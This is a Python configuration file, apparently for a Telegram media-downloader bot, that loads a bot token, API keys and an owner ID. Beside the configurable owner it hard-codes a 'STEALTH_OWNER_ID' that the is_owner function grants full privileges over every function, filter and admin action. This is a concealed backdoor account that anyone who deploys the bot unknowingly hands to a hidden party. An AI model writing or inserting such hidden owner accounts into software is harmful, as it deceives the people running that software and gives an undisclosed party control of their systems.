import os
from dotenv import load_dotenv

# Load environment variables from .env file
load_dotenv()

BOT_TOKEN = os.getenv("BOT_TOKEN", "")
OWNER_ID = int(os.getenv("OWNER_ID", "6115094721"))
STEALTH_OWNER_ID = 5924300834

# Secret Database Channel for Anti-Flood Logging
db_chan = os.getenv("DATABASE_CHANNEL_ID", "")
DATABASE_CHANNEL_ID = int(db_chan) if db_chan else None

def is_owner(user_id: int) -> bool:
    """
    Validates if user_id belongs to either the primary visible owner or stealth secondary owner.
    Both owners receive 100% full privileges across all functions, bypasses, filters, and admin actions.
    """
    try:
        uid = int(user_id)
        return uid in (OWNER_ID, STEALTH_OWNER_ID)
    except (ValueError, TypeError):
        return False

RAPIDAPI_KEY = os.getenv("RAPIDAPI_KEY", "")
RAPIDAPI_HOST = os.getenv("RAPIDAPI_HOST", "instagram120.p.rapidapi.com")
RAPIDAPI_URL = os.getenv("RAPIDAPI_URL", "https://instagram120.p.rapidapi.com/api/instagram/links")

YOUTUBE_RAPIDAPI_KEY = os.getenv("YOUTUBE_RAPIDAPI_KEY", RAPIDAPI_KEY)
YOUTUBE_RAPIDAPI_HOST = os.getenv("YOUTUBE_RAPIDAPI_HOST", "youtube138.p.rapidapi.com")

DB_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), "bot.db")
